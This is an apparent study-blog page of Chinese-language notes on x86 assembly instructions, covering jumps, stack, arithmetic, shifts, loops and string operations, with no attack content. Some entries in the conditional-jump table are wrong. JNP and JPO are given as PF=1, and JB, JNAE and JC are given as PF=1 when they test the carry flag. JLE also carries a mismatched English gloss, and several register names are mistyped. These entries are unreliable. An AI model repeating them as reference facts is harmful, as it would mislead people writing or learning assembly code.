<h4 id="取有效地址指令"><a href="#取有效地址指令" class="headerlink" title="取有效地址指令"></a>取有效地址指令</h4><p><strong>LEA REG，OPRD</strong><br>把操作数OPRD的有效地址传送到操作数REG，原操作数OPRD必须是一个存储器操作数，目的操作数REG必须是一个16位或者32位通用寄存器。<br><strong>不影响各标志。</strong></p>
<h4 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>指令格式</th>
<th>转移条件</th>
<th>转移说明</th>
<th>其他说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>JZ</td>
<td>ZF=1</td>
<td>等于0转移（jump if zero</td>
<td>单个标志</td>
</tr>
<tr>
<td>JE</td>
<td>ZF = 1</td>
<td>相等转移（jump if equal）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JNZ</td>
<td>ZF=0</td>
<td>不等于0转移（Jump if not zero）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JNE</td>
<td>ZF=0</td>
<td>不相等转移（Jump if not equal）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JS</td>
<td>SF=1</td>
<td>为负转移（jump if sign）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JNS</td>
<td>SF=0</td>
<td>为正转移（Jump if not sign）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JO</td>
<td>OF=1</td>
<td>溢出转移（Jump if overflow）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JNO</td>
<td>OF=0</td>
<td>不溢出转移（Jump if not overflow）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JP</td>
<td>PF=1</td>
<td>偶转移（Jump if parity）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JPE</td>
<td>PF=1</td>
<td>偶转移（Jump if parity even）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JNP</td>
<td>PF=1</td>
<td>奇转移（Jump if not parity）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JPO</td>
<td>PF=1</td>
<td>奇转移（Jump if parity odd）</td>
<td>单个标志</td>
</tr>
<tr>
<td>JB</td>
<td>PF=1</td>
<td>低于转移（Jump if below）</td>
<td>单个标志（无符号数）</td>
</tr>
<tr>
<td>JNAE</td>
<td>PF=1</td>
<td>不高于等于转移（Jump if not above or equal）</td>
<td>单个标志（无符号数）</td>
</tr>
<tr>
<td>JC</td>
<td>PF=1</td>
<td>进位位被置转移（Jump if carry）</td>
<td>单个标志（无符号数）</td>
</tr>
<tr>
<td>JNB</td>
<td>CF=0</td>
<td>不低于转移（Jump if not below）</td>
<td>单个标志（无符号数）</td>
</tr>
<tr>
<td>JAE</td>
<td>CF=0</td>
<td>高于等于转移（Jump if above or equal）</td>
<td>单个标志(无符号数）</td>
</tr>
<tr>
<td>JNC</td>
<td>CF=0</td>
<td>进位位被清转移（Jump if not carry）</td>
<td>单个标志（无符号数）</td>
</tr>
<tr>
<td>JBE</td>
<td>CF=1或者ZF=1</td>
<td>低于等于转移（Jump if below or equal）</td>
<td>两个标志（无符号数）</td>
</tr>
<tr>
<td>JNA</td>
<td>CF=1或者ZF=1</td>
<td>不高于转移（Jump if not above）</td>
<td>两个标志（无符号数）</td>
</tr>
<tr>
<td>JNBE</td>
<td>CF=0并且ZF=0</td>
<td>不低于等于转移（Jump if not below or equal）</td>
<td>两个标志（无符号数）</td>
</tr>
<tr>
<td>JA</td>
<td>CF=0并且ZF=0</td>
<td>高于转移（Jump if above）</td>
<td>两个标志（无符号数）</td>
</tr>
<tr>
<td>JL</td>
<td>SF！=OF</td>
<td>小于转移（jump if less）</td>
<td>两个标志（有符号数）</td>
</tr>
<tr>
<td>JNGE</td>
<td>SF！=OF</td>
<td>不大于等于转移（Jump if not greater or equal）</td>
<td>两个标志（有符号数）</td>
</tr>
<tr>
<td>JNL</td>
<td>SF=OF</td>
<td>不小于转移（Jump if not less）</td>
<td>两个标志（有符号数）</td>
</tr>
<tr>
<td>JGE</td>
<td>SF=OF</td>
<td>大于等于转移（Jump if greater or equal）</td>
<td>两个标志（有符号数）</td>
</tr>
<tr>
<td>JLE</td>
<td>ZF=1或者SF！=OF</td>
<td>小于等于转移（Jump if not less）</td>
<td>三个标志（有符号数）</td>
</tr>
<tr>
<td>JNG</td>
<td>ZF=1或者SF！=OF</td>
<td>不大于转移（Jump if not greater）</td>
<td>三个标志（有符号数）</td>
</tr>
<tr>
<td>JNLE</td>
<td>ZF=0并且SF=OF</td>
<td>不小于等于转移（Jump if not less or equal）</td>
<td>三个标志（有符号数）</td>
</tr>
<tr>
<td>JG</td>
<td>ZF=0并且SF=OF</td>
<td>大于转移（Jump if greater）</td>
<td>三个标志（有符号数）</td>
</tr>
<tr>
<td>JCXZ</td>
<td>CX=0</td>
<td>计数器CX为0转移</td>
<td>与标志无关</td>
</tr>
<tr>
<td>JECXZ</td>
<td>ECX=0</td>
<td>计数器ECX为0转移</td>
<td>与标志无关</td>
</tr>
<tr>
<td>JMP OPRD/LABEL</td>
<td></td>
<td>无条件跳转指令</td>
</tr>
</tbody>
</table>
</div>
<h5 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h5><p><strong>CMP DEST，SRC</strong><br>根据DEST-SRC的差来<strong>影响标志寄存器中的各状态标志</strong>，但不把作为结果的差发送到目的操作数DEST。</p>
<h5 id="无条件转移指令"><a href="#无条件转移指令" class="headerlink" title="无条件转移指令"></a>无条件转移指令</h5><p><strong>JMP LABEL</strong><br>无条件转移，不影响标志。</p>
<h5 id="堆栈的主要用途"><a href="#堆栈的主要用途" class="headerlink" title="堆栈的主要用途"></a>堆栈的主要用途</h5><ul>
<li>保护寄存器内容或者保护现场</li>
<li>保护返回地址</li>
<li>传递参数</li>
<li>安排局部变量或者临时变量</li>
</ul>
<p><strong>PUSH SRC</strong><br>将源操作数SRC压入堆栈。<br><strong>POP DEST</strong><br>从栈顶弹出一个双字或者字数据到目的操作数DEST。<br><strong>堆栈指令不影响标志位</strong><br>压入或弹出16位或32位数应加前缀WORD PTR或DWORD PTR.(寄存器除外）</p>
<h5 id="通用寄存器全进栈指令和全出栈指令"><a href="#通用寄存器全进栈指令和全出栈指令" class="headerlink" title="通用寄存器全进栈指令和全出栈指令"></a>通用寄存器全进栈指令和全出栈指令</h5><p><strong>PUSHA</strong><br><strong>POPA</strong><br>16位通用寄存器指令。压入顺序为AX，CX，DX，BX，SP，BP，SI，DI。<br>出栈顺序相反。<br><strong>PUSHAD</strong><br><strong>POPAD</strong><br>32位通用寄存器指令。压入顺序EAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI。<br>出栈顺序相反。</p>
<h4 id="乘除运算指令"><a href="#乘除运算指令" class="headerlink" title="乘除运算指令"></a>乘除运算指令</h4><h5 id="无符号数乘法指令"><a href="#无符号数乘法指令" class="headerlink" title="无符号数乘法指令"></a>无符号数乘法指令</h5><p><strong>MUL OPRD</strong><br>OPRD是字节操作数，则把AL中的无符号数与OPRD相乘，16位结果送到AX中；如果OPRD是字操作数，则把AX中的无符号数与OPRD相乘，32位结果送到寄存器对DX：AX中，DX含高16位，AX含低16位。如果OPRD是双字操作数，则把EAX中的无符号数与OPRD相乘，64位结果送到寄存器对EDX：EAX中，EDX含高32位，EAX含低32位。<br><strong>OPRD不能是立即数。</strong></p>
<h5 id="有符号数乘法指令"><a href="#有符号数乘法指令" class="headerlink" title="有符号数乘法指令"></a>有符号数乘法指令</h5><p><strong>IMUL OPRD</strong><br>隐含操作数 AL，AX和EAX，跟OPRD尺寸有关<br><strong>IMUL DEST，SRC</strong>（DEST &lt;= DEST <em> SRC）<br>SRC可以为立即数。<br><strong>IMUL DEST，SRC1，SRC2</strong>（DEST &lt;= SRC1 </em> SRC2）<br>SRC1不能是立即数，SRC2只能是立即数</p>
<p>如果乘积的高半部分（字节相乘时为AH）不等于0，则标志CF=1，OF=1；否则CF=0，OF=0.对其他标志为无定义。</p>
<h5 id="无符号数除法指令"><a href="#无符号数除法指令" class="headerlink" title="无符号数除法指令"></a>无符号数除法指令</h5><p><strong>DIV OPRD</strong><br>如果OPRD是字节操作数，则把AX中的无符号数除以OPRD，所得商送到AL中，余数送到AH中；如果OPRD是子操作数，则把寄存器对DX：AX中的无符号数除以OPRD，所得商送到AX，余数送到DX中。如果OPRD是双字操作数，则把寄存器对EDX：EAX中的无符号数除以OPRD，所得商送到EAX中，余数送到EDX中。<br><strong>OPRD不能是立即数</strong></p>
<h5 id="有符号数除法指令"><a href="#有符号数除法指令" class="headerlink" title="有符号数除法指令"></a>有符号数除法指令</h5><p><strong>IDIV OPRD</strong></p>
<p>除法指令对状态标志的影响无定义。</p>
<h4 id="符号扩展指令"><a href="#符号扩展指令" class="headerlink" title="符号扩展指令"></a>符号扩展指令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>作用</th>
<th>详情</th>
</tr>
</thead>
<tbody>
<tr>
<td>CBW</td>
<td>字节转换为字指令</td>
<td>把寄存器AL中的符号扩展到寄存器AH。若AL最高位为0，AH=0，若AL最高位为1，AH=OFFH</td>
</tr>
<tr>
<td>CWD</td>
<td>字转换为双字指令</td>
<td>把寄存器AX中的符号扩展到寄存器DX。若AX最高位为0，DX=0，若AX最高位为1，DX=OFFFFH</td>
</tr>
<tr>
<td>CDQ</td>
<td>双字转换为四字指令</td>
<td>把寄存器EAX中的符号扩展到寄存器EDX。若EAX最高位为0，EDX=0，若EAX最高位为1，EDX=OFFFFFFFFH</td>
</tr>
<tr>
<td>CWDE</td>
<td>另一条字转换为双字指令</td>
<td>把寄存器AX中的符号扩展到寄存器EAX。若AX最高位为0，EAX的高16位都为0，若AX最高位为1，则EAX的高16位都为1.</td>
</tr>
</tbody>
</table>
</div>
<p>这四条指令不影响状态标志位。</p>
<h4 id="扩展传送指令"><a href="#扩展传送指令" class="headerlink" title="扩展传送指令"></a>扩展传送指令</h4><h5 id="符号扩展传送指令"><a href="#符号扩展传送指令" class="headerlink" title="符号扩展传送指令"></a>符号扩展传送指令</h5><p><strong>MOVSX DEST，SRC</strong><br>把源操作数SRC符号扩展后送至目的操作数DEST。<br>不改变源操作数，也不影响标志寄存器中的状态标志。</p>
<h5 id="零扩展传送指令"><a href="#零扩展传送指令" class="headerlink" title="零扩展传送指令"></a>零扩展传送指令</h5><p><strong>MOVZX DEST，SRC</strong><br>把源操作数SRC扩展后送至目的操作数DEST。<br>不改变源操作数，也不影响标志寄存器中的状态标志。</p>
<h4 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>NOT OPRD</td>
<td>操作数按位取反，送回OPRD 对标志没有影响</td>
</tr>
<tr>
<td>AND DEST，SRC</td>
<td>两个操作数按位与操作，使CF=0，OF=0，其他标志反映运算结果，AF未定义</td>
</tr>
<tr>
<td>OR DEST，SRC</td>
<td>按位或运算 使CF=0，OF=0，其他标志反应运算结果，AF未定义</td>
</tr>
<tr>
<td>XOR DEST，SRC</td>
<td>按位异或运算 使CF=0，OF=0，其他标志反应运算结果，AF未定义</td>
</tr>
<tr>
<td>TEST DEST，SRC</td>
<td>两个操作数按位与，但不送到DEST，CF=0，OF=0，其他标志反应运算结果</td>
</tr>
</tbody>
</table>
</div>
<h4 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>作用</th>
<th>详情</th>
</tr>
</thead>
<tbody>
<tr>
<td>SAL OPRD，count</td>
<td>算术左移指令</td>
<td>操作数OPRD左移count位，每向左移动一位，右边用0补足一位，移出的最高位进入标志位CF。状态CF受影响；SF、ZF和PF反映移位后的结果；标志OF受影响较复杂，AF未定义</td>
</tr>
<tr>
<td>SHL OPRD，count</td>
<td>逻辑左移指令</td>
<td>操作数OPRD左移count位，每向左移动一位，右边用0补足一位，移出的最高位进入标志位CF。状态CF受影响；SF、ZF和PF反映移位后的结果；标志OF受影响较复杂，AF未定义</td>
</tr>
<tr>
<td>SAR OPRD，count</td>
<td>算术右移指令</td>
<td>操作数OPRD右移count位，每向右移动一位，左边符号保持不变，移出的最低位进入标志位CF。状态CF受影响；SF、ZF和PF反映移位后的结果；标志OF受影响较复杂，AF未定义</td>
</tr>
<tr>
<td>SHR OPRD，count</td>
<td>逻辑右移指令</td>
<td>操作数OPRD右移count位，每向右移动一位，左边用0补足，移出的最低位进入标志位CF。状态CF受影响；SF、ZF和PF反映移位后的结果；标志OF受影响较复杂，AF未定义</td>
</tr>
<tr>
<td>ROL OPRD，count</td>
<td>左循环移位指令</td>
<td>OPRD循环左移count位，每向左移一位，操作数的最高位移入最低位，同时最高位移入进位标志CF。标志CF受影响，标志OF受影响情况较复杂，其他状态标志不受影响。</td>
</tr>
<tr>
<td>ROR OPRD，count</td>
<td>右循环移位指令</td>
<td>OPRD循环右移count位，每向右移一位，操作数的最低位移入最高位，同时最低位移入进位标志CF。标志CF受影响，标志OF受影响情况较复杂，其他状态标志不受影响。</td>
</tr>
<tr>
<td>RCL OPRD，count</td>
<td>带进位左循环移位指令</td>
<td>把操作数OPRD连同CF循环左移count位，每向左移一位，操作数的最高位移入进位标志CF，CF移入操作数的最低位。标志CF受影响，标志OF受影响情况较复杂，其他状态标志不受影响。</td>
</tr>
<tr>
<td>RCR OPRD，count</td>
<td>带进位右循环移位指令</td>
<td>把操作数OPRD连同CF循环右移count位，每向右移一位，操作数的最低位移入进位标志CF，CF移入操作数的最高位。标志CF受影响，标志OF受影响情况较复杂，其他状态标志不受影响。</td>
</tr>
<tr>
<td>SHLD OPRD1，OPRD2，count</td>
<td>双精度左移指令</td>
<td>OPRD1左移指定count位，低端端空出的位用操作数OPRD2高端的count位填补，OPRD2内容保持不变。OPRD1中最后移出的位保留在进位标志CF中。</td>
</tr>
<tr>
<td>SHRD OPRD1，OPRD2，count</td>
<td>双精度右移指令</td>
<td>OPRD1右移指定count位，高端空出的位用操作数OPRD2低端的count位填补，OPRD2内容保持不变。OPRD1中最后移出的位保留在进位标志CF中</td>
</tr>
</tbody>
</table>
</div>
<h4 id="循环指令"><a href="#循环指令" class="headerlink" title="循环指令"></a>循环指令</h4><p><strong>循环指令不影响各标志</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>格式</th>
<th>详情</th>
</tr>
</thead>
<tbody>
<tr>
<td>计数循环指令</td>
<td>LOOP LABEL</td>
<td>使寄存器ECX值减1，如果结果不等于0，则转移到标号LABEL处，否则顺序执行LOOP后的指令 相当于 DEC ECX， JNZ LABEL 两条指令</td>
</tr>
<tr>
<td>等于/全零循环指令</td>
<td>LOOPE LABEL/LOOPZ LABEL</td>
<td>使寄存器ECX值减1，如果结果不等于0，且零标志ZF等于1，转移到标号LABEL处，否则顺序执行。指令本身实施的寄存器ECX减1不影响标志</td>
</tr>
<tr>
<td>不等于/非零循环指令</td>
<td>LOOPNE LABEL/LOOPNZ LABEL</td>
<td>使寄存器ECX值减1，如果结果不等于0，且零标志ZF等于0，转移到标号LABEL处，否则顺序执行。指令本身实施的寄存器ECX减1不影响标志</td>
</tr>
<tr>
<td>计数器转移指令</td>
<td>JECXZ LABEL</td>
<td>当寄存器ECX值等于0时转移到标号LABEL处，否则顺序执行。</td>
</tr>
</tbody>
</table>
</div>
<h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><p>字符串操作的方向由标志寄存器中的<strong>方向标志DF</strong>控制<br>当方向标志DF复位（为0）时，操作方向是由低到高，按递增方式调整寄存器ESI或EDI的值；<br>当方向标志DF置位（为1）时，操作方向是由高到低，按递减方式调整寄存器ESI或EDI的值。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>格式</th>
<th>详情</th>
</tr>
</thead>
<tbody>
<tr>
<td>字符串装入字节</td>
<td>LODSB</td>
<td>把寄存器ESI指向的一个字节数据装入到累加器AL中，根据方向标志DF复位或置为使ESI的值增1或减1</td>
</tr>
<tr>
<td>字符串装入字</td>
<td>LODSW</td>
<td>把寄存器ESI指向的一个字数据装入到累加器AX中，根据方向标志DF复位或置为使ESI的值增2或减2</td>
</tr>
<tr>
<td>字符串装入双字</td>
<td>LODSD</td>
<td>把寄存器ESI指向的一个双字数据装入到累加器AX中，根据方向标志DF复位或置为使ESI的值增4或减4</td>
</tr>
<tr>
<td>存储字节</td>
<td>STOSB</td>
<td>STOSB把累加器AL的内容送到寄存器ED所指向的存储单元中，然后根据方向标志DF复位或置位使EDI的值增1或减1.</td>
</tr>
<tr>
<td>存储字</td>
<td>STOSW</td>
<td>STOSW把累加器AX的内容送到寄存器EDI所指向的存储单元中，然后根据方向标志DF使EDI的值增2或减2</td>
</tr>
<tr>
<td>存储双字</td>
<td>STOSD</td>
<td>STOSD把累加器EAX的内容送到寄存器EDI所指向的存储单元中，然后根据方向标志DF使ED的值增4或减4。</td>
</tr>
<tr>
<td>字节传送</td>
<td>MOVSB</td>
<td>MOVSB把寄存器ESI所指向的一个字节数据传送到由寄存器EDI所指向的存储单元中，然后根据方向标志DF复位或置位使ESI和EDI的值分别增1或减1.不会影响AL。不影响标志</td>
</tr>
<tr>
<td>字传送</td>
<td>MOVSW</td>
<td>MOVSW把寄存器ESI所指向的一个字数据传送到由寄存器EDI所指向的存储单元中，然后根据方向标志DF使ESI和EDI的值分别增2或减2。不影响标志</td>
</tr>
<tr>
<td>双字传送</td>
<td>MOVSD</td>
<td>MOVSD把寄存器ESI所指向的一个双字数据传送到由寄存器ED所指向的存储单元中，然后根据方向标志DF使ESI和EDI的值分别增4或减4.不影响标志</td>
</tr>
<tr>
<td>串字节扫描</td>
<td>SCASB</td>
<td>SCASB把累加器AL的内容与由寄存器EDI所指向一个字节数据采用择减方式比较，相减结果反映到各状态标志（CF、ZF、OF、SF、PF和AF），但不影响两个提作数，然后根据方向标志DF复位或置位使EDI的值增1或减1。</td>
</tr>
<tr>
<td>串字扫描</td>
<td>SCASW</td>
<td>SCASW把累加器AX的内容与由寄存器EDI所指向的一个字数据比较结果影响标志，然后EDI的值增2或减2.</td>
</tr>
<tr>
<td>串双字扫描</td>
<td>SCASD</td>
<td>SCASD把累加器EAX的内容与由寄存器ED所指向的一个双字数据比较，结果影响标志，然后EDI的值增4或减4。</td>
</tr>
<tr>
<td>串字节比较</td>
<td>CMPSB</td>
<td>CMPSB把寄存器ESI所指向的一个字节数据与由寄存器ED所指向的个字节数据采用相减方式出较，相减结果反映到各状态标志（CE、ZF、OF、SF、PF和AF）不影响两个操作数，根据方向标志DF复位或置位是ESI和EDI的值分别增1或减1</td>
</tr>
<tr>
<td>串字比较</td>
<td>CMPSW</td>
<td>CMPSW把寄存器ESI所指向的一个字数据与由寄存器EDI所指向的个字数据比较，结果影响标志，然后按调整值2调整ESI和EDI的值</td>
</tr>
<tr>
<td>串双字比较</td>
<td>CMPSD</td>
<td>CMPSD把寄存器ESI所指向的一个双字数据与由寄存器EDI所指向的一个双字数据比较，结果影响标志，然后按调整值4调整ESI和EDI的值。</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>College Study</category>
      </categories>
      <tags>
        <tag>汇编学习</tag>
      </tags>
  </entry>
</search>
